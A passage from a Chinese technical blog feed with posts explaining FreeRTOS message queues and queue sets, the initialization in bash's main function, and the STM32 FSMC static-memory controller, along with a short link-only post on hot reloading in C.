    <content type="html"><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>FreeRTOS中队列也可以称之为消息队列。在FreeRTOS中长用来进行数据传输。队列提供了</p><ul><li>从任务到任务</li><li>中断到任务</li><li>任务到中断<br>三种消息的传递方向。</li></ul><p>任务能够从队列中读取消息，当队列中的消息为空时，读取消息的任务将被阻塞。用户还可以指定阻塞的任务时间xTicksToWait，在这段时间中，如果队列为空，该任务将保持阻塞状态以等待队列数据有效。当队列中有新消息时，被阻塞的任务会被唤醒并处理新消息；当等待的时间超过指定的阻塞时间，即使队列中尚无有效数据，任务也会自动从阻塞态转为就绪态。消息队列是一种异步的通信方式。</p><p>事实上FreeRTOS中的队列不仅仅支持<strong>先进先出</strong>，也是支持<strong>先进后出</strong>的。</p><p>创建消息队列时FreeRTOS会先给消息队列分配一块内存空间，这块内存的大小等于［消息队列控制块大小+（单个消息空间大小×消息队列长度）］，接着再初始化消息队列，此时消息队列为空。FreeRTOS的消息队列控制块由多个元素组成，当消息队列被创建时，系统会为控制块分配对应的内存空间，用于保存消息队列的一些信息，如消息的存储位置、头指针pcHead、尾指针pcTail、消息大小uxItemSize以及队列长度uxLength等。同时每个消息队列都与消息空间在同一段连续的内存空间中，在创建成功时，这些内存就被占用了，只有删除消息队列时，这段内存才会被释放。创建成功时就已经分配好每个消息空间与消息队列的容量，无法更改，每个消息空间可以存放不大于消息大小（uxItemSize）的任意类型的数据，所有消息队列中的消息空间总数即消息队列的长度，这个长度可在消息队列创建时指定。</p><p>任务或者中断服务程序都可以给消息队列发送消息。当发送消息时，如果队列未满或者允许覆盖入队，FreeRTOS会将消息复制到消息队列队尾，否则会根据用户指定的阻塞超时时间进行阻塞。在这段时间中，如果队列一直不允许入队，该任务将保持阻塞状态以等待队列允许入队。当其他任务从其等待的队列中读取入数据（队列未满）时，该任务将自动由阻塞态转换为就绪态。<strong>当等待的时间超过了指定的阻塞时间，即使队列中还不允许入队，任务也会自动从阻塞态转换为就绪态，此时发送消息的任务或者中断程序会收到一个错误代码errQUEUE_FULL。</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401192346732.png"></p><p>所以消息队列所占内存实际上就是：</p><ul><li>消息控制块</li><li>消息所占用的空间</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401192354254.png"></p><h2 id="队列中的阻塞"><a href="#队列中的阻塞" class="headerlink" title="队列中的阻塞"></a>队列中的阻塞</h2><p>阻塞机制只可以在任务中使用，无法在中断里使用。</p><p>消息队列中阻塞的处理只有三种方式</p><ul><li>当消息队列已满，永远等待下去</li><li>当消息队列已满，指定等待时间，如果时间到了还是没有空闲位置则发送消息的任务或者是中断程序会受到一个错误码errQUEUE_FULL</li><li>当队列消息已满，不等待，而去执行其他任务</li></ul><p>假如有多个任务阻塞在一个消息队列中，那么这些阻塞的任务将按照任务优先级进行排序，优先级高的任务将优先获得队列的访问权。</p><h1 id="队列的使用"><a href="#队列的使用" class="headerlink" title="队列的使用"></a>队列的使用</h1><p>消息队列可用于发送不定长消息的场合，包括任务与任务间的消息交换。队列是FreeRTOS主要的任务间通信方式，可以在任务与任务间、中断和任务间传送信息，发送到队列的消息是通过复制方式实现的，这意味着队列存储的数据是原始数据，而不是原始数据的引用。</p><h2 id="数据结构和函数"><a href="#数据结构和函数" class="headerlink" title="数据结构和函数"></a>数据结构和函数</h2><p>消息队列的控制块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QueueDefinition</span> /* <span class="hljs-title">The</span> <span class="hljs-title">old</span> <span class="hljs-title">naming</span> <span class="hljs-title">convention</span> <span class="hljs-title">is</span> <span class="hljs-title">used</span> <span class="hljs-title">to</span> <span class="hljs-title">prevent</span> <span class="hljs-title">breaking</span> <span class="hljs-title">kernel</span> <span class="hljs-title">aware</span> <span class="hljs-title">debuggers</span>. */</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int8_t</span> * pcHead;           <span class="hljs-comment">/**&lt; Points to the beginning of the queue storage area. */</span><br>    <span class="hljs-type">int8_t</span> * pcWriteTo;        <span class="hljs-comment">/**&lt; Points to the free next place in the storage area. */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    &#123;</span><br>        QueuePointers_t xQueue;     <span class="hljs-comment">/**&lt; Data required exclusively when this structure is used as a queue. */</span><br>        SemaphoreData_t xSemaphore; <span class="hljs-comment">/**&lt; Data required exclusively when this structure is used as a semaphore. */</span><br>    &#125; u;<br><br>    List_t xTasksWaitingToSend;             <span class="hljs-comment">/**&lt; List of tasks that are blocked waiting to post onto this queue.  Stored in priority order. */</span><br>    List_t xTasksWaitingToReceive;          <span class="hljs-comment">/**&lt; List of tasks that are blocked waiting to read from this queue.  Stored in priority order. */</span><br><br>    <span class="hljs-keyword">volatile</span> UBaseType_t uxMessagesWaiting; <span class="hljs-comment">/**&lt; The number of items currently in the queue. */</span><br>    UBaseType_t uxLength;                   <span class="hljs-comment">/**&lt; The length of the queue defined as the number of items it will hold, not the number of bytes. */</span><br>    UBaseType_t uxItemSize;                 <span class="hljs-comment">/**&lt; The size of each items that the queue will hold. */</span><br><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int8_t</span> cRxLock;                <span class="hljs-comment">/**&lt; Stores the number of items received from the queue (removed from the queue) while the queue was locked.  Set to queueUNLOCKED when the queue is not locked. */</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int8_t</span> cTxLock;                <span class="hljs-comment">/**&lt; Stores the number of items transmitted to the queue (added to the queue) while the queue was locked.  Set to queueUNLOCKED when the queue is not locked. */</span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( ( configSUPPORT_STATIC_ALLOCATION == 1 ) &amp;&amp; ( configSUPPORT_DYNAMIC_ALLOCATION == 1 ) )</span><br>        <span class="hljs-type">uint8_t</span> ucStaticallyAllocated; <span class="hljs-comment">/**&lt; Set to pdTRUE if the memory used by the queue was statically allocated to ensure no attempt is made to free the memory. */</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_QUEUE_SETS == 1 )</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QueueDefinition</span> * <span class="hljs-title">pxQueueSetContainer</span>;</span><br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TRACE_FACILITY == 1 )</span><br>        UBaseType_t uxQueueNumber;<br>        <span class="hljs-type">uint8_t</span> ucQueueType;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; xQUEUE;<br></code></pre></td></tr></table></figure><p><code>pcWriteTo</code>指向队列消息存储区下一个可用消息空间。</p><p><code>pcReadFrom</code>与<code>uxRecursiveCallCount</code>是一对互斥变量，使用联合体来确保两个互斥的结构体成员不会同时出现。当结构体用于队列时，<code>pcReadFrom</code>指向出队消息空间的最后一个，也就是读取消息时是从<code>pcReadFrom</code>指向的空间读取消息内容。</p><p><code>xTasksWaitingToSend</code>是一个<strong>发送</strong>消息阻塞列表，用于保存阻塞在此队列的任务，任务按照优先级进行排序。由于队列已满，想要发送消息的任务无法发送消息。</p><p><code>xTasksWaitingToReceive</code>是一个<strong>获取</strong>消息阻塞列表，用于保存阻塞在此队列的任务，任务按照优先级进行排序。由于队列是空的，想要获取消息的任务无法获取消息。</p><h2 id="消息队列创建函数"><a href="#消息队列创建函数" class="headerlink" title="消息队列创建函数"></a>消息队列创建函数</h2><p>分为动态创建队列<code>xQueueCreate()</code>和静态创建队列<code>xQueueCreateStatic()</code>使用静态创建消息队列函数创建队列时需要的形参更多，需要的内存在编译时预先分配好，一般很少使用这种方法。</p><p>初始化消息队列：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401200033341.png"></p><h3 id="静态创建队列函数"><a href="#静态创建队列函数" class="headerlink" title="静态创建队列函数"></a>静态创建队列函数</h3><p><code>xQueueCreateStatic()</code>是一个函数宏，其实质是函数<code>xQueueGenericCreateStatic( ( uxQueueLength ), ( uxItemSize ), ( pucQueueStorage ), ( pxQueueBuffer ), ( queueQUEUE_TYPE_BASE ) )</code><br>这个函数使用数组的形式来申请静态内存空间。</p><p>使用实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-number">1</span> <span class="hljs-comment">/* 创建一个可以最多可以存储10个64位变量的队列 */</span><br> <span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">define</span> QUEUE_LENGTH    10</span><br> <span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">define</span> ITEM_SIZE       sizeof( uint64_t )</span><br> <span class="hljs-number">4</span><br> <span class="hljs-number">5</span> <span class="hljs-comment">/* 该变量用于存储队列的数据结构 */</span><br> <span class="hljs-number">6</span> <span class="hljs-type">static</span> StaticQueue_t xStaticQueue;<br> <span class="hljs-number">7</span><br> <span class="hljs-number">8</span> <span class="hljs-comment">/* 该数组作为队列的存储区域，大小至少有uxQueueLength * uxItemSize个字节 */</span><br> <span class="hljs-number">9</span> <span class="hljs-type">uint8_t</span> ucQueueStorageArea[ QUEUE_LENGTH * ITEM_SIZE ];<br><span class="hljs-number">10</span><br><span class="hljs-number">11</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vATask</span><span class="hljs-params">( <span class="hljs-type">void</span> *pvParameters )</span><br>12 &#123;<br><span class="hljs-number">13</span>     QueueHandle_t xQueue;<br><span class="hljs-number">14</span><br><span class="hljs-number">15</span> <span class="hljs-comment">/* 创建一个队列 */</span><br><span class="hljs-number">16</span>     xQueue = xQueueCreateStatic( QUEUE_LENGTH,         <span class="hljs-comment">/* 队列深度 */</span><br><span class="hljs-number">17</span>                                  ITEM_SIZE,            <span class="hljs-comment">/* 队列数据单元的单位 */</span><br><span class="hljs-number">18</span>                                  ucQueueStorageArea,   <span class="hljs-comment">/* 队列的存储区域 */</span><br><span class="hljs-number">19</span>                                  &amp;xStaticQueue );  <span class="hljs-comment">/* 队列的数据结构 */</span><br><span class="hljs-number">20</span> <span class="hljs-comment">/* 剩余代码 */</span><br><span class="hljs-number">21</span> &#125;<br></code></pre></td></tr></table></figure><h2 id="队列删除函数"><a href="#队列删除函数" class="headerlink" title="队列删除函数"></a>队列删除函数</h2><p>队列删除函数是根据消息队列句柄直接删除的，删除之后这个消息队列的所有信息都会被系统回收清空，而且不能再次使用这个消息队列，但是需要注意的是，如果某个消息队列没有被创建，当然是无法删除的。</p><h2 id="向队列发送数据"><a href="#向队列发送数据" class="headerlink" title="向队列发送数据"></a>向队列发送数据</h2><p>消息队列发送函数有多个，都是使用宏定义进行展开的，有些只能在任务中调用，有些只能在中断中调用。</p><h3 id="xQueueSend-与xQueueSendToBack"><a href="#xQueueSend-与xQueueSendToBack" class="headerlink" title="xQueueSend()与xQueueSendToBack()"></a>xQueueSend()与xQueueSendToBack()</h3><p>xQueueSend()等同于xQueueSendToBack()。</p><p>xQueueSend()是一个宏，宏展开是调用函数xQueueGenericSend()，这个函数的实现过程在后面会详细讲解。该宏是为了向后兼容没有包含xQueueSendToFront()和xQueueSend-ToBack()这两个宏的FreeRTOS版本。xQueueSend()等同于xQueueSendToBack()。</p><p>xQueueSend()用于向队列尾部发送一个队列消息。消息以复制的形式入队，而不是以引用的形式。该函数绝对不能在中断服务程序中被调用，中断中必须使用带有中断保护功能的xQueueSendFromISR()来代替。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401200114056.png"></p><p>xQueueSend()用于向队列尾部发送一个队列消息。消息以复制的形式入队，而不是以引用的形式。该函数绝对不能在中断服务程序中被调用，中断中必须使用带有中断保护功能的xQueueSendFromISR()来代替。</p><h3 id="xQueueSendFromISR-与xQueueSendToBackFromISR"><a href="#xQueueSendFromISR-与xQueueSendToBackFromISR" class="headerlink" title="xQueueSendFromISR()与xQueueSendToBackFromISR()"></a>xQueueSendFromISR()与xQueueSendToBackFromISR()</h3><p>xQueueSendFromISR()是一个宏，宏展开是调用函xQueueGenericSendFromISR()。该宏是xQueueSend()的中断保护版本，用于在中断服务程序中向队列尾部发送一个队列消息，等价于xQueueSendToBackFromISR()。</p><h1 id="队列集"><a href="#队列集" class="headerlink" title="队列集"></a>队列集</h1><p>有时我们需要多次接受数据，此时可以使用多个队列集来完成这个任务。</p><p><strong>队列设置允许所有任务从多个队列接收数据，而无需任务依次轮询每个队列以确定哪个队列(如果有)包含数据。</strong></p><p>与使用接收结构的单个队列实现相同功能的设计相比，使用队列集从多个源接收数据的设计不那么整洁，效率也较低。因此，建议仅在设计约束绝对必要时才使用队列集。</p><p>队列集中的内容可以是队列，也可以是信号量。</p><h2 id="队列集的创建"><a href="#队列集的创建" class="headerlink" title="队列集的创建"></a>队列集的创建</h2><p>相关函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">QueueSetHandle_t <span class="hljs-title function_">xQueueCreateSet</span><span class="hljs-params">(<span class="hljs-type">const</span> UBaseType_t uxEventQueueLength)</span>;<br></code></pre></td></tr></table></figure><p>参数说明：<br>uxEventQueueLength:</p><blockquote><p>当队列集合中的一个队列接收数据时，接收队列的句柄被发送到队列集合。 <code>uxEventQueueLength</code> 定义了正在创建的队列集在任何时候可以容纳的队列句柄的最大数量。队列句柄仅在队列集中的队列接收数据时发送给队列集。如果队列已满，则无法接收数据，因此如果队列集中的所有队列都已满，则无法向队列集发送队列句柄。因此，队列集中一次必须容纳的最大项目数是该组中每个队列长度的总和。例如，如果集合中有三个空队列，每个队列的长度为五，那么集合中的队列总共可以在集合中的所有队列都满之前接收十五个项目(三个队列乘以五个项目)。在该示例中，<code>uxEventQueueLength</code> 必须设置为 15，以保证队列集可以接收发送给它的每个项目。信号量也可以添加到队列集中。二进制和计数信号量将在本书后面介绍。为了计算必要的<code>uxEventQueueLength</code>，二进制信号量的长度为 1，计数信号量的长度由信号量的最大计数值给出。作为另一个例子，如果队列集将包含长度为 3 的队列和长度为 1 的二进制信号量，<code>uxEventQueueLength</code> 必须设置为 4 (3+1)。</p></blockquote><p>返回值:<br>如果返回<code>NULL</code>则表示没有足够的空间创建队列集了, 如果返回非0值则代表成功创建.返回的值就是该队列集的句柄</p><h2 id="添加队列或信号量"><a href="#添加队列或信号量" class="headerlink" title="添加队列或信号量"></a>添加队列或信号量</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BaseType_t <span class="hljs-title function_">xQueueAddToSet</span><span class="hljs-params">( QueueSetMemberHandle_t xQueueOrSemaphore, QueueSetHandle_t xQueueSet )</span>;<br></code></pre></td></tr></table></figure><p>这个函数可以向队列集中添加一个队列或者是信号量. </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bash源码分析(1)--初始化</title>
    <link href="/2024/01/10/bash%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1-%E5%88%9D%E5%A7%8B%E5%8C%96/"/>
    <url>/2024/01/10/bash%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-1-%E5%88%9D%E5%A7%8B%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>主要是bash的main函数中的内容</p><span id="more"></span><h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>马上毕业了, 想写一个类似于<code>bash</code>这样的<code>shell</code>.作为自己的一个项目. 但是又苦于没有现成的书籍和资料. 只好自己研究一下<code>bash</code>的源代码, 看看前辈是怎么写的. 我选择的bash版本是<code>bash-2.04</code>. 随便选的, 主要是太新的<code>bash</code>代码抽象度都很高,之后找到之前的版本来看看. </p><h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>我首先看的就是<code>shell.c</code>这个文件, 其中包含了<code>bash</code>的初始化操作, 也就是<code>main.c</code>函数. 下面总结一下<code>bash</code>是如何初始化的, 它的初始化的顺序是怎么样的, 代码架构是怎样的. </p><p>由于<code>main</code>函数很长, 所以我将其进行划分描述. </p><h2 id="第一部分-杂项设置"><a href="#第一部分-杂项设置" class="headerlink" title="第一部分 杂项设置"></a>第一部分 杂项设置</h2><p>这一部分是<code>main</code>函数的开头, 主要进行了一些<strong>需要使用的参数的定义,并且初始化</strong>、检查终端（tty）、根据当地的地理地址设置好相关内容、设置好<code>setjmp()</code>函数方便之后重新初始化的时候使用函数<code>longjmp()</code>跳回来.</p><p>下面根据代码来详细讲讲每一部分</p><h3 id="参数定义-初始化"><a href="#参数定义-初始化" class="headerlink" title="参数定义&amp;初始化"></a>参数定义&amp;初始化</h3><p><code>main</code>函数开头就定义了几个变量, 但是这些变量是给<code>main</code>函数使用的, 而不是<code>bash</code>的参数. 如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">register</span> <span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> code, saverst, old_errexit_flag;<br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> locally_skip_execution;<br><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> arg_index, top_level_arg_index;<br><span class="hljs-comment">//第一个参数是 i 是用来在main函数中的for循环中加减的参数</span><br><span class="hljs-comment">//code用来接受函数的返回值, 一般用作进行状态的判断</span><br><span class="hljs-comment">//saverst用来在后面的参数解析的时候短暂保存状态</span><br><span class="hljs-comment">//old_errexit_flag用来保存错误退出码</span><br><span class="hljs-comment">//arg_index是函数的argv的索引</span><br><span class="hljs-comment">//top_level_arg_index用来保存arg_index</span><br></code></pre></td></tr></table></figure><p>下面主要是<code>bash</code>需要的一些参数的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">// arg_index: 参数索引</span><br><span class="hljs-comment">// local_pending_command: 本地将要执行的命令</span><br><span class="hljs-comment">// want_pending_command: 提供-c命令</span><br><span class="hljs-comment">// locally_skip_execution: </span><br><span class="hljs-comment">// read_from_stdin: 提供-s命令</span><br><span class="hljs-comment">// default_input: 默认输入文件流</span><br>arg_index = <span class="hljs-number">1</span>;<br>local_pending_command = (<span class="hljs-type">char</span> *)<span class="hljs-literal">NULL</span>;<br>want_pending_command = locally_skip_execution = read_from_stdin = <span class="hljs-number">0</span>;<br>default_input = <span class="hljs-built_in">stdin</span>;<br></code></pre></td></tr></table></figure><h1 id="分析-main-c-函数"><a href="#分析-main-c-函数" class="headerlink" title="分析 main.c 函数"></a>分析 main.c 函数</h1><p>使用的 bash 版本是 bash-1.14.7 版本。这个版本比较古老，主要是代码相较于新本版的 bash 更加简洁，没有一层层的封装。</p><p>首先主要是对于 main.c 函数的主要流程的分析。</p><h2 id="main-c-流程分析"><a href="#main-c-流程分析" class="headerlink" title="main.c 流程分析"></a>main.c 流程分析</h2><p>这段代码是一个shell程序的主函数（<code>main</code>），可能是bash或其他类似shell的简化版本。下面是对这段代码的分析：</p><ol><li><p><strong>变量声明</strong>：</p><ul><li><code>register int i;</code>：使用<code>register</code>关键字声明一个整型变量<code>i</code>，这通常用于循环或频繁使用的地方，以提高访问速度。</li><li><code>int arg_index, locally_skip_execution;</code>：声明了两个整型变量，用于跟踪参数索引和是否跳过执行。</li><li><code>int top_level_arg_index, read_from_stdin;</code>：声明了两个整型变量，用于跟踪顶级参数索引和是否从标准输入读取。</li><li><code>FILE *default_input;</code>：声明了一个指向<code>FILE</code>结构的指针，用于默认输入。</li></ul></li><li><p><strong>特定系统问题的修复</strong>：</p><ul><li>检查是否存在NeXT 2.1 rlogind的bug，如果是，则尝试打开<code>/dev/tty</code>，如果失败，则尝试使用<code>ttyname</code>获取终端名称并打开。</li></ul></li><li><p><strong>调试和用户信息</strong>：</p><ul><li>如果正在调试登录shell，则无限循环。</li><li>获取当前用户的UID、GID、EUID和EGID。</li><li>检查是否以特权模式运行（UID或GID与EUID或EGID不匹配）。</li></ul></li><li><p><strong>环境变量检查</strong>：</p><ul><li>检查环境变量<code>POSIXLY_CORRECT</code>或<code>POSIX_PEDANTIC</code>是否存在，以确定是否启用POSIX兼容模式。</li></ul></li><li><p><strong>内存检查</strong>：</p><ul><li>如果定义了<code>USE_GNU_MALLOC_LIBRARY</code>，则调用<code>mcheck</code>函数进行内存检查。</li></ul></li><li><p><strong>异常处理</strong>：</p><ul><li>使用<code>setjmp</code>和<code>subshell_top_level</code>设置异常处理。</li></ul></li><li><p><strong>初始化</strong>：</p><ul><li>初始化参数索引、本地变量等。</li><li>检查是否为登录shell，并进行相应的初始化。</li></ul></li><li><p><strong>解析命令行参数</strong>：</p><ul><li>循环遍历命令行参数，解析长参数和短参数。</li><li>根据参数设置标志，如<code>interactive_comments</code>、<code>login_shell</code>等。</li></ul></li><li><p><strong>交互式shell检测</strong>：</p><ul><li>根据参数和标准输入&#x2F;输出是否为终端，设置是否为交互式shell。</li></ul></li><li><p><strong>关闭文件描述符</strong>：</p><ul><li>如果是登录shell且交互式，关闭文件描述符3到19。</li></ul></li><li><p><strong>初始化shell</strong>：</p><ul><li>调用<code>shell_initialize</code>函数进行shell初始化。</li></ul></li><li><p><strong>版本显示和启动脚本执行</strong>：</p><ul><li>显示版本信息。</li><li>执行启动脚本。</li></ul></li><li><p><strong>处理命令行参数</strong>：</p><ul><li>如果有<code>-c</code>参数，将剩余参数绑定到<code>$0</code>到<code>$n</code>。</li></ul></li><li><p><strong>交互式shell设置</strong>：</p><ul><li>如果是交互式shell，设置邮件检查、历史记录等。</li></ul></li><li><p><strong>读取输入并执行命令</strong>：</p><ul><li>根据是否交互式，设置输入源。</li><li>进入命令读取循环。</li></ul></li><li><p><strong>退出处理</strong>：</p><ul><li>执行退出陷阱。</li><li>保存历史记录。</li><li>结束作业控制。</li><li>返回最后命令的退出状态。</li></ul></li></ol><p>这段代码展示了一个shell程序的启动过程，包括参数解析、环境设置、异常处理、交互式模式检测、命令执行等。代码中包含了大量的注释，有助于理解每个部分的功能。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c实现热加载</title>
    <link href="/2024/01/10/c%E5%AE%9E%E7%8E%B0%E7%83%AD%E5%8A%A0%E8%BD%BD/"/>
    <url>/2024/01/10/c%E5%AE%9E%E7%8E%B0%E7%83%AD%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>stm32中常见的三种延时函数总结</p><span id="more"></span><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://howardlau.me/programming/c-cpp-hot-reload.html">https://howardlau.me/programming/c-cpp-hot-reload.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FSMC总结</title>
    <link href="/2024/01/08/FSMC%E6%80%BB%E7%BB%93/"/>
    <url>/2024/01/08/FSMC%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="0-基础知识"><a href="#0-基础知识" class="headerlink" title="0 基础知识"></a>0 基础知识</h1><p>FSMC：Flexible Static Memory Controller的缩写，译为<strong>灵活的静态存储控制器</strong>。它可以用于驱动包括<code>SRAM</code>、<code>NOR FLASH</code>以及<code>NAND FLSAH</code>类型的存储器，不能驱动如SDRAM这种动态的存储器。它的不足在于不可以驱动动态存储器。但是如果具有FMC这个外设，则可以支持控制SDRAM存储器。</p><p>由于fsmc是映射在stm32内存中的，所以其和sram、falsh、eeprom等等外设不一样，其可以直接对数据进行操作，而不需要什么先发送写或读信号，发送什么地址信号等等。</p><p>所有的外部存储器共享控制器输出的地址、数据和控制信号，<strong>每个外部设备可以通过一个唯一的片选信号加以区分</strong>。<strong>FSMC在任一时刻只访问一个外部设备。</strong></p><p>具有静态存储器接口的器件包括：</p><ul><li>静态随机存储器(SRAM) </li><li>只读存储器(ROM) </li><li>NOR闪存</li><li>PSRAM(4个存储器块)</li></ul><h1 id="1-0-详细结构"><a href="#1-0-详细结构" class="headerlink" title="1.0 详细结构"></a>1.0 详细结构</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401081616643.png"></p><p>由上可知，FSMC主要有四个部分：</p><ul><li>AHB</li><li>NOR闪存控制器</li><li>NAND闪存、PC卡控制器</li><li>外部接口</li></ul><p>下面一一说明每个部分的作用。</p><h2 id="1-1-AHB接口"><a href="#1-1-AHB接口" class="headerlink" title="1.1 AHB接口"></a>1.1 AHB接口</h2><p>AHB接口为内部CPU和其它总线控制设备访问外部静态存储器提供了通道。<br>AHB操作被转换到外部设备的操作。当选择的外部存储器的数据通道是16或8位时，在AHB上的32位数据会被分割成连续的16或8位的操作。</p><p><strong>AHB时钟(HCLK)是FSMC的参考时钟。</strong></p><h1 id="2-0-外部设备地址映像"><a href="#2-0-外部设备地址映像" class="headerlink" title="2.0 外部设备地址映像"></a>2.0 外部设备地址映像</h1><p>从FSMC的角度看，可以把外部存储器划分为固定大小为256M字节的四个存储块：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401081736070.png"></p><p>同时这四个内存块中的每一个又被细分。</p><p>具体的划分可以在stm32参考手册中查找到。19.4节</p><h1 id="3-0-NOR闪存和PSRAM控制器"><a href="#3-0-NOR闪存和PSRAM控制器" class="headerlink" title="3.0 NOR闪存和PSRAM控制器"></a>3.0 NOR闪存和PSRAM控制器</h1><p>上面我们知道这个FSMC，被划分为四个部分的内存。但是其实只有三种存储器类型。</p><p>FSMC可以产生适当的信号时序，驱动下述类型的存储器：</p><ul><li>异步SRAM和ROM <ul><li>8位</li><li>16位</li><li>32位</li></ul></li><li>PSRAM(Cellular RAM) <ul><li>异步模式</li><li>突发模式</li></ul></li><li>NOR闪存<ul><li>异步模式或突发模式</li><li>复用模式或非复用模式</li></ul></li></ul><p>FSMC对每个存储块输出一个唯一的片选信号NE[4:1]，所有其它的(地址、数据和控制)信号则是共享的。</p><h2 id="3-1-控制寄存器"><a href="#3-1-控制寄存器" class="headerlink" title="3.1 控制寄存器"></a>3.1 控制寄存器</h2><h2 id="3-2-时序寄存器"><a href="#3-2-时序寄存器" class="headerlink" title="3.2 时序寄存器"></a>3.2 时序寄存器</h2><p>由于每一种的存储设备具有不同的读写时序, 所以FSMC提供了多种时序模式来匹配对应的存储设备的读写时序. </p><p>时序寄存器主要控制的是这个设备的时钟信号.</p><ul><li>所有信号由内部时钟HCLK保持同步，但该时钟不会输出到存储器；</li><li>FSMC始终在片选信号NE失效前对数据线采样，这样能够保证符合存储器的数据保持时序(片选失效至数据失效的间隔，通常最小为0ns)；</li><li>当设置了扩展模式，可以在读和写时混合使用模式A、B、C和D(例如，允许以模式A进行读，而以模式B进行写)。</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401091604661.png"></p><p>这张表主要显示了时序寄存器中的内容.</p><p>FSMC外设支持输出多种不同的时序以便于控制不同的存储器, NOR闪存和PSRAM支持了6中模式:</p><ul><li>模式一, SRAM&#x2F;CRAM</li><li>模式A, 只是模式一的OE反向</li><li>模式B(模式二), NOR闪存</li><li>模式C, 只是模式B的OE反向</li><li>模式D, 带地址扩展的异步操作</li><li>复用模式, 地址&#x2F;数据复用的NOR闪存异步操作</li></ul><p>每一类存储设备需要使用对应的模式</p><p>每一种模式的时序都不相同,例如在模式一下的读时序和写时序如下:</p><p>图中的<code>N</code>代表的是低位有效<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401091607529.png"></p><p><img 